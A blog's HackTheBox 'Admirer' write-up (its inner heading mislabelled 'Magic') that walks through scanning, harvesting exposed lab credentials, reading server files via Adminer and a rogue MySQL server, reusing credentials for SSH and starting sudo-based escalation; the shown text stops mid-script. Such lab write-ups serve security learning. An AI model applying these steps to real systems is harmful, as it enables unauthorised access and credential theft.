<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox: Admirer write-up | GoDiego</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="HackTheBox: Admirer write-up" /><meta name="author" content="Diego Bernal Adelantado" /><meta property="og:locale" content="en_US" /><meta name="description" content="Did you know about SETENV? What about using PYTHONPATH? Recon never ends, credentials are never enough, especially in Admirer!" /><meta property="og:description" content="Did you know about SETENV? What about using PYTHONPATH? Recon never ends, credentials are never enough, especially in Admirer!" /><link rel="canonical" href="https://diego95root.github.io/posts/Admirer/" /><meta property="og:url" content="https://diego95root.github.io/posts/Admirer/" /><meta property="og:site_name" content="GoDiego" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-03T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox: Admirer write-up" /><meta name="twitter:site" content="@secfaults" /><meta name="twitter:creator" content="@Diego Bernal Adelantado" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"HackTheBox: Admirer write-up","dateModified":"2020-06-03T00:00:00+02:00","datePublished":"2020-06-03T00:00:00+02:00","url":"https://diego95root.github.io/posts/Admirer/","mainEntityOfPage":{"@type":"WebPage","@id":"https://diego95root.github.io/posts/Admirer/"},"author":{"@type":"Person","name":"Diego Bernal Adelantado"},"description":"Did you know about SETENV? What about using PYTHONPATH? Recon never ends, credentials are never enough, especially in Admirer!","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="google-site-verification" content="H84_zouPIHmurw2-AF7oHrWvvqJ1HhxxPpp1B6Vjpx4" /><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async crossorigin="anonymous"></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/logo.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">GoDiego</a></div><div id="site-subtitle" class="font-italic">Student, Bug Hunter, Security Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/diego95root" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/secfaults" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/diego-bernal-adelantado" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/31531" target="_blank"> <i class="fas fa-cube"></i> </a> <a href=" javascript:window.open('mailto:' + ['diegobernal0905','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox: Admirer write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox: Admirer write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Wed, Jun 3, 2020, 12:00 AM +0200"> Jun 3, 2020 <i class="unloaded">2020-06-03T00:00:00+02:00</i> </span> by <span class="author"> Diego Bernal Adelantado </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Oct 20, 2020, 7:19 PM +0100"> Oct 20, 2020 <i class="unloaded">2020-10-20T20:19:16+02:00</i> </span></div></div><div class="post-content"> <img src="/assets/posts_details/Admirer/images/header.png"><h1 id="hack-the-box-magic-machine-write-up">Hack The Box: Magic machine write-up</h1><p>This was one of the most interesting machines I’ve solved in Hack The Box, learned some cool techniques. It taught me how recon never ends, despite having found many things there is always stuff to discover and bruteforce. On top of that, I learned that Python has a <code class="highlighter-rouge">PYTHONPATH</code> variable, used to load libraries! This, of course, can be hijacked, which is what we are going to do in the box.</p><p>Let’s dig in! The IP of the machine is <code class="highlighter-rouge">10.10.10.187</code>.</p><h2 id="enumeration">Enumeration</h2><p>I start by enumerating open ports to discover the services running in the machine. I fire up nmap:</p><p><em>Result of nmap scan</em></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.70 scan initiated Mon May 25 19:17:36 2020 as: nmap -p- -sV -sC -oA nmap/all 10.10.10.187</span>
Nmap scan report <span class="k">for </span>10.10.10.187 <span class="o">(</span>10.10.10.187<span class="o">)</span>
Host is up <span class="o">(</span>0.075s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 <span class="o">(</span>RSA<span class="o">)</span>
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Admirer
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon May 25 19:35:29 2020 -- 1 IP address (1 host up) scanned in 1072.95 seconds</span>
</pre></table></code></div></div><p>Interesting, we have FTP, a web server and SSH! I first tried to see if anonymous login was allowed in the FTP server but no luck, so decided to dive into the web application.</p><h3 id="port-80-enumeration">Port 80 enumeration</h3><p>We can see that this is some sort of photography website:</p><p><em>Initial webpage</em></p><p><img src="/assets/posts_details/Admirer/images/website.png" alt="Img" /></p><p>Now, one interesting thing my nmap scan caught was <code class="highlighter-rouge">robots.txt</code>. I visited it and found two interesting things: a username (<code class="highlighter-rouge">waldo</code>) and a directory (<code class="highlighter-rouge">admin-dir</code>).</p><p><em>Robots.txt information</em></p><p><img src="/assets/posts_details/Admirer/images/robots.png" alt="Img" /></p><p>Now the message was pretty explicit so I manually tried to get the files myself without bruteforcing and to my surprise managed to get them in the first few tries: <code class="highlighter-rouge">credentials.txt</code> and <code class="highlighter-rouge">contacts.txt</code>.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="gp">root@kali:~/Desktop/Admirer#</span><span class="w"> </span>curl http://admirer.htb/admin-dir/credentials.txt
<span class="go">[Internal mail account]
w.cooper@admirer.htb
</span><span class="gp">fgJr6q#</span>S<span class="se">\W</span>:<span class="nv">$P</span>
<span class="go">
[FTP account]
ftpuser
</span><span class="gp">%n?4Wz}R$</span>tTF7
<span class="go">
[Wordpress account]
admin
w0rdpr3ss01!
</span><span class="gp">root@kali:~/Desktop/Admirer#</span><span class="w"> </span>curl http://admirer.htb/admin-dir/contacts.txt
<span class="gp">#</span><span class="c">#########</span>
<span class="gp">#</span><span class="w"> </span>admins <span class="c">#</span>
<span class="gp">#</span><span class="c">#########</span>
<span class="gp">#</span><span class="w"> </span>Penny
<span class="go">Email: p.wise@admirer.htb


</span><span class="gp">#</span><span class="c">#############</span>
<span class="gp">#</span><span class="w"> </span>developers <span class="c">#</span>
<span class="gp">#</span><span class="c">#############</span>
<span class="gp">#</span><span class="w"> </span>Rajesh
<span class="go">Email: r.nayyar@admirer.htb

</span><span class="gp">#</span><span class="w"> </span>Amy
<span class="go">Email: a.bialik@admirer.htb

</span><span class="gp">#</span><span class="w"> </span>Leonard
<span class="go">Email: l.galecki@admirer.htb



</span><span class="gp">#</span><span class="c">############</span>
<span class="gp">#</span><span class="w"> </span>designers <span class="c">#</span>
<span class="gp">#</span><span class="c">############</span>
<span class="gp">#</span><span class="w"> </span>Howard
<span class="go">Email: h.helberg@admirer.htb

</span><span class="gp">#</span><span class="w"> </span>Bernadette
<span class="go">Email: b.rauch@admirer.htb
</span></pre></table></code></div></div><p>Looks like we have credentials for the FTP service: <code class="highlighter-rouge">ftpuser</code>:<code class="highlighter-rouge">%n?4Wz}R$tTF7</code>.</p><h3 id="port-21-enumeration">Port 21 enumeration</h3><p>I logged in using the credentials found to find two files, both of which I downloaded to inspect locally.</p><p><em>FTP connection</em></p><p><img src="/assets/posts_details/Admirer/images/ftp.png" alt="Img" /></p><ul><li><code class="highlighter-rouge">dump.sql</code> didn’t contain useful information, as it was only a text file with the schema of a database.</li><li><code class="highlighter-rouge">html.tar.gz</code> contained the following files:</li></ul><p><em>Files contained in tar file</em></p><p><img src="/assets/posts_details/Admirer/images/new-data.png" alt="Img" /></p><p>I started to inspect files in <code class="highlighter-rouge">/w4ld0s_s3cr3t_d1r</code> and found that credentials had an extra set: <code class="highlighter-rouge">[Bank Account]</code>. However, I couldn’t find any way to use them.</p><p><em>New credentials found</em></p><p><img src="/assets/posts_details/Admirer/images/new-credentials.png" alt="Img" /></p><p>Then I moved on to <code class="highlighter-rouge">/utility-scripts</code> and found different scripts, out of which <code class="highlighter-rouge">db_admin.php</code> was the most interesting:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
  <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
  <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"Wh3r3_1s_w4ld0?"</span><span class="p">;</span>

  <span class="c1">// Create connection</span>
  <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>

  <span class="c1">// Check connection</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">die</span><span class="p">(</span><span class="s2">"Connection failed: "</span> <span class="o">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">echo</span> <span class="s2">"Connected successfully"</span><span class="p">;</span>


  <span class="c1">// TODO: Finish implementing this or find a better open source alternative</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>There was another one called <code class="highlighter-rouge">info.php</code> which called <code class="highlighter-rouge">phpinfo()</code>:</p><p><em>Discovering new files</em></p><p><img src="/assets/posts_details/Admirer/images/phpinfo.png" alt="Img" /></p><p>However, the credentials weren’t useful. I then looked at <code class="highlighter-rouge">index.php</code> and found, once again, more credentials. But guess what? I wouldn’t be able to use them anywhere.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"]F7jLHw:*G&gt;UPrTo}~A"</span><span class="nx">d6b</span><span class="s2">";
</span><span class="nv">$dbname</span><span class="s2"> = "</span><span class="nx">admirerdb</span><span class="s2">";
</span></pre></table></code></div></div><p>I was out of ideas.</p><h3 id="back-to-port-80">Back to port 80</h3><p>With this new information I figured that I was missing some kind of information, so I started to bruteforce files again. I tried with all the new directories from the files that I had got from the FTP service and eventually got something!</p><p><em>Discovering new files</em></p><p><img src="/assets/posts_details/Admirer/images/brute2.png" alt="Img" /></p><p><em>Adminer instance on /utility-scripts/adminer.php</em></p><p><img src="/assets/posts_details/Admirer/images/adminer.png" alt="Img" /></p><p>Ironically none of the credentials worked, I tried many combinations but not a single one gave me access. A bit lost again I decided to look for exploits given the version of Adminer. I stumbled upon this article: <a href="https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f</a>.</p><p>Then, after a bit more of googling I found that there is a serious flag in Adminer via which an attacker can connect to their local SQL server and request local files! Here is the <a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">article</a>.</p><h2 id="gaining-user">Gaining user</h2><p>The strategy was simple: set up a local SQL server, then request files until we get some sort of credentials.</p><h3 id="setting-up-the-sql-server">Setting up the SQL server</h3><p>I first started the service and set up a database called <code class="highlighter-rouge">test</code>.</p><p><em>Setting up the database</em></p><p><img src="/assets/posts_details/Admirer/images/adminer0.png" alt="Img" /></p><p>Then I had to open up the database to allow remote connections. I used this <a href="https://websiteforstudents.com/configure-remote-access-mysql-mariadb-databases/">article</a> as a guide. This was done by modifying <code class="highlighter-rouge">/etc/mysql/mariadb.conf.d/50-server.cnf</code>:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bind-address = 0.0.0.0
</pre></table></code></div></div><p>Then restart the server and we could get connections!</p><p><em>Connecting to my local database</em></p><p><img src="/assets/posts_details/Admirer/images/adminer1.png" alt="Img" /></p><p>Hmmmm, I kept on reading the article and realised I hadn’t granted permissions!</p><p><em>Granting permissions (part 1)</em></p><p><img src="/assets/posts_details/Admirer/images/adminer05.png" alt="Img" /></p><p>Weirdly enough, I didn’t get in. However, the error message was different.</p><p><em>Different error on second attempt</em></p><p><img src="/assets/posts_details/Admirer/images/adminer2.png" alt="Img" /></p><p>Then I granted permissions to the normal root user and was in!</p><p><em>Granting permissions (part 2)</em></p><p><img src="/assets/posts_details/Admirer/images/adminer15.png" alt="Img" /></p><p><em>Exploit successful</em></p><p><img src="/assets/posts_details/Admirer/images/adminer4.png" alt="Img" /></p><h3 id="reading-local-files">Reading local files</h3><p>I started to read local files with <code class="highlighter-rouge">/etc/passwd</code> but there appeared to be some sort of restriction to read files from absolute paths.</p><p><em>Reading files restriction</em></p><p><img src="/assets/posts_details/Admirer/images/adminer5.png" alt="Img" /></p><p>So I figured that I could try to read <code class="highlighter-rouge">index.php</code>. My reasoning was the following: as this was the database of the website and in the <code class="highlighter-rouge">index.php</code> from the FTP server I had found some credentials, then if I could get the actual <code class="highlighter-rouge">index.php</code> I could get the valid credentials for the database. Eventually using <code class="highlighter-rouge">../index.php</code> worked.</p><p><em>Executing SQL commands</em></p><p><img src="/assets/posts_details/Admirer/images/adminer6.png" alt="Img" /></p><p><em>Reading the source code</em></p><p><img src="/assets/posts_details/Admirer/images/adminer7.png" alt="Img" /></p><p><em>Getting new credentials</em></p><p><img src="/assets/posts_details/Admirer/images/adminer8.png" alt="Img" /></p><p>Now with this new set of credentials I was able to access the local database and started looking around. However, I couldn’t find anything juicy. Then it dawned on me that these credentials could actually be the username and password for the SSH! I tried and was in.</p><p><em>Using the database credentials for SSH</em></p><p><img src="/assets/posts_details/Admirer/images/ssh.png" alt="Img" /></p><h2 id="privilege-escalation">Privilege escalation</h2><p>As always, I started running <code class="highlighter-rouge">sudo -l</code> to see if I could run something as root being <code class="highlighter-rouge">waldo</code>.</p><p><em>Sudoers file</em></p><p><img src="/assets/posts_details/Admirer/images/sudo-enum.png" alt="Img" /></p><p>Turns out I do so I quickly went and checked out <code class="highlighter-rouge">/opt/scripts/admin_tasks.sh</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

view_uptime<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/uptime <span class="nt">-p</span>
<span class="o">}</span>

view_users<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/w
<span class="o">}</span>

view_crontab<span class="o">()</span>
<span class="o">{</span>
    /usr/bin/crontab <span class="nt">-l</span>
<span class="o">}</span>

backup_passwd<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/passwd to /var/backups/passwd.bak..."</span>
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        <span class="nb">echo</span> <span class="s2">"Done."</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_shadow<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Backing up /etc/shadow to /var/backups/shadow.bak..."</span>
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        <span class="nb">echo</span> <span class="s2">"Done."</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_web<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
        /opt/scripts/backup.py &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>

backup_db<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running mysqldump in the background, it may take a while..."</span>
        <span class="c">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span>
        /usr/bin/mysqldump <span class="nt">-u</span> root admirerdb <span class="o">&gt;</span> /var/backups/dump.sql &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>



<span class="c"># Non-interactive way, to be used by the web interface</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 1 <span class="o">]</span>
<span class="k">then
    </span><span class="nv">option</span><span class="o">=</span><span class="nv">$1</span>
    <span class="k">case</span> <span class="nv">$option</span> <span class="k">in
        </span>1<span class="p">)</span> view_uptime <span class="p">;;</span>
        2<span class="p">)</span> view_users <span class="p">;;</span>
        3<span class="p">)</span> view_crontab <span class="p">;;</span>
        4<span class="p">)</span> backup_passwd <span class="p">;;</span>
        5<span class="p">)</span> backup_shadow <span class="p">;;</span>
        6<span class="p">)</span> backup_web <span class="p">;;</span>
        7<span class="p">)</span> backup_db <span class="p">;;</span>

